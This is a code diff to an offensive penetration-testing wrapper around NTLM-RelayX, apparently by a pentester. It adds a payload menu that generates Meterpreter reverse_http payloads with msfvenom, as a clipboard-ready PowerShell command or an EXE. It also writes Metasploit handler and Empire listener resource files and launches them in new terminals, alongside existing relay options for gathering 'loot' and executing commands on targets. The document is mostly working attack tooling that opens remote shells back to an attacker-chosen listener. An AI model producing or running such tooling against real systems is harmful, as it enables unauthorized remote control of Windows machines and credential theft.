@@ -4,7 +4,7 @@
 # https://github.com/rmdavy
 # Released under Apache V2 see LICENCE for more information
 # 
-import os, signal, sys, re, string, readline, subprocess
+import os, signal, sys, re, string, readline, subprocess, pyperclip
 import netifaces as nic
 import pexpect
 
@@ -32,6 +32,13 @@ def quit():
 		os.remove("/tmp/nxhosts.txt")
 	if os.path.isfile("/tmp/cmd.sh"):
 		os.remove("/tmp/cmd.sh")
+	if os.path.isfile("/tmp/empire.sh"):
+		os.remove("/tmp/empire.sh")
+	if os.path.isfile("/tmp/empire.rc"):
+		os.remove("/tmp/empire.rc")
+	if os.path.isfile("/tmp/msf_handler.rc"):
+		os.remove("/tmp/msf_handler.rc")
+
 	#exit
 	sys.exit(0)
 
@@ -135,6 +142,9 @@ def relay_execute_cmd():
 		#Launch Responder
 		launchresponder()
 
+	if not os.path.isfile("/tmp/nxhosts.txt"):
+		print colored('\n[-]Please generate a hosts file...','yellow') 
+
 def relay_execute_file():
 	#Clear Screen
 	os.system('clear')
@@ -148,14 +158,153 @@ def relay_execute_file():
 		#Launch Responder
 		launchresponder()
 
+def empirelauncher():
+	#Store Path to Empire for easy manipulation
+	empirepath="/opt/Empire"
+	#Clear Screen
+	os.system('clear')
+
+	if os.path.isdir(empirepath):
+		print colored('[+]Configure Empire Details','yellow') 
+		emp_listener_ip = raw_input("[+]Enter Listener IP:- ")
+		emp_listener_port = raw_input("[+]Enter Listener Port:- ")
+
+		#Create Launcher File
+		f = open("/tmp/empire.rc", "w")
+		f.write("listeners\n\n")
+		f.write("uselistener http\n\n")
+		f.write("set Name http%s\n\n" % (emp_listener_port))
+		f.write("set Host http://%s:%s\n\n" % (emp_listener_ip,emp_listener_port))
+		f.write("set Port %s\n\n" % (emp_listener_port))
+		f.write("execute\n\n")
+		f.write("launcher powershell\n\n")
+		f.close()
+
+		#Create Launcher File
+		f = open("/tmp/empire.sh", "w")
+		f.write("cd %s\n" % (empirepath))
+		f.write("./empire -r /tmp/empire.rc\n")
+		f.close()	
+	
+		#If bash launcher file is created change execute permissions
+		if os.path.isfile("/tmp/empire.sh"):
+			os.system("chmod +x /tmp/empire.sh")
+		
+		#Execute Empire with Resource File in New Window
+		os.system("gnome-terminal -- \"bash\" -c \"/tmp/empire.sh\"")
+	else:
+		print colored('\n[-]Cannot find Empire Powershell in %s' % (empirepath),'yellow') 	
+
+def msflauncher_psh():
+	#Clear screen
+	os.system('clear')
+	#Configure payload
+	msf_payload="windows/meterpreter/reverse_http"
+	#Get details for payload
+	print colored('[+]Configure Metasploit Payload - %s' % (msf_payload),'yellow') 
+	msf_listener_ip = raw_input("[+]Enter Listener IP:- ")
+	msf_listener_port = raw_input("[+]Enter Listener Port:- ")
+	
+	#Create metasploit resource file for handler
+	msf_resource_file = open("/tmp/msf_handler.rc", "w")
+	msf_resource_file.write("use multi/handler\n")
+	msf_resource_file.write("set payload %s\n" % (msf_payload))
+	msf_resource_file.write("set LHOST %s\n" % (msf_listener_ip))
+	msf_resource_file.write("set LPORT %s\n" % (msf_listener_port))
+	msf_resource_file.write("set ExitOnSession false\n")
+	msf_resource_file.write("set EnableStageEncoding true\n")
+	msf_resource_file.write("exploit -j -z")
+	msf_resource_file.close()
+
+	#Launch metasploit with resource file
+	os.system("gnome-terminal -- \"bash\" -c \"msfconsole -r /tmp/msf_handler.rc \"")
+	
+	#Generate Powershell Payload
+	output = pexpect.run("msfvenom -p %s LHOST=%s LPORT=%s --arch x86 --platform win -f psh-cmd " % (msf_payload,msf_listener_ip,msf_listener_port))
+	
+	#Display Payload to screen and also copy to clipboard
+	print colored('[+]MSF Powershell Payload Generated\n','yellow')
+	#Truncate initial bit of string
+	print output[output.find("powershell"):len(output)]
+	#Display message
+	print colored('\n[+]Launcher Copied to Clipboard\n','yellow')
+	#Copy payload to clipboard
+	pyperclip.copy(output[output.find("powershell"):len(output)])
+
+def msflauncher_exe():
+	#Clear screen
+	os.system('clear')
+	#configure variable
+	msf_exename="/tmp/meta.exe"
+	#Configure payload
+	msf_payload="windows/meterpreter/reverse_http"
+	#Get details for payload
+	print colored('[+]Configure Metasploit Payload - %s' % (msf_payload),'yellow') 
+	msf_listener_ip = raw_input("[+]Enter Listener IP:- ")
+	msf_listener_port = raw_input("[+]Enter Listener Port:- ")
+	
+	#Create metasploit resource file for handler
+	msf_resource_file = open("/tmp/msf_handler.rc", "w")
+	msf_resource_file.write("use multi/handler\n")
+	msf_resource_file.write("set payload %s\n" % (msf_payload))
+	msf_resource_file.write("set LHOST %s\n" % (msf_listener_ip))
+	msf_resource_file.write("set LPORT %s\n" % (msf_listener_port))
+	msf_resource_file.write("set ExitOnSession false\n")
+	msf_resource_file.write("set EnableStageEncoding true\n")
+	msf_resource_file.write("exploit -j -z")
+	msf_resource_file.close()
+
+	#Launch metasploit with resource file
+	print colored('[+]Launching Metasploit\n','yellow')
+	os.system("gnome-terminal -- \"bash\" -c \"msfconsole -r /tmp/msf_handler.rc \"")
+	
+	#Generate EXE Payload
+	output = pexpect.run("msfvenom -p %s LHOST=%s LPORT=%s --arch x86 --platform win -f exe -o %s" % (msf_payload,msf_listener_ip,msf_listener_port,msf_exename))
+	
+	if os.path.isfile(msf_exename):
+		#Display Payload to screen and also copy to clipboard
+		print colored('[+]MSF Powershell Payload Generated %s , filepath copied to clipboard\n' % (msf_exename),'yellow')
+		pyperclip.copy(msf_exename)
+
+def payload_menu():
+	#Clear Screen
+	os.system('clear')
+	# Display options to the user
+	print("\nPayload Selection:")
+	print("\n\t(1)\tGenerate Metasploit Powershell Launcher")
+	print("\t(2)\tGenerate Metasploit EXE Launcher")
+	print("\t(3)\tGenerate Empire PowerShell Launcher")
+	print("\t(99)\tBack to Main Menu")
+
+	options = {1: msflauncher_psh,
+			2: msflauncher_exe,
+			3: empirelauncher,
+			99: main,
+	}
+
+	# Generate payload
+	try:
+		payload_option = input("\nSelect payload: ")
+		options[payload_option ]()
+	except KeyError:
+		pass
+
 def main():
 	#Clear Screen
 	os.system('clear')
 	#Display Banner
 	print '\n'
 	print colored('NXW - NTLM-RelayX Wrapper','green')
-	print colored('Version 1.0 ','yellow')
+	print colored('Version 1.1 ','yellow')
 	print colored('By @rd_pentest','blue') 
+	
+	#Quick check to see whether the necessary files are installed
+	if not os.path.isfile("/usr/share/responder/tools/RunFinger.py"):
+		print colored('\n[-]File not found - /usr/share/responder/tools/RunFinger.py','yellow') 
+
+	if not os.path.isfile("/usr/local/bin/ntlmrelayx.py"):
+		print colored('\n[-]File not found - /usr/local/bin/ntlmrelayx.py\n','yellow') 
+
 	#Print menu to screen
 	while(1):
 		print("\n\t(1)\tTurn On SMB and HTTP in Responder.conf")
@@ -164,6 +313,7 @@ def main():
 		print("\t(4)\tLaunch NTLM-RelayX Attack and gather l00t")
 		print("\t(5)\tLaunch NTLM-RelayX Attack and Execute file")
 		print("\t(6)\tLaunch NTLM-RelayX Attack and Execute command")
+		print("\t(7)\tGenerate Payload")
 		print("\t(99)\tQuit")
 		#User options
 		options = {1: enablerepsonderconf,
@@ -172,6 +322,7 @@ def main():
 					4: relay_loot,
 					5: relay_execute_file,
 					6: relay_execute_cmd,
+					7: payload_menu,
 					98: clearscreen,
 					99: quit,
 		}
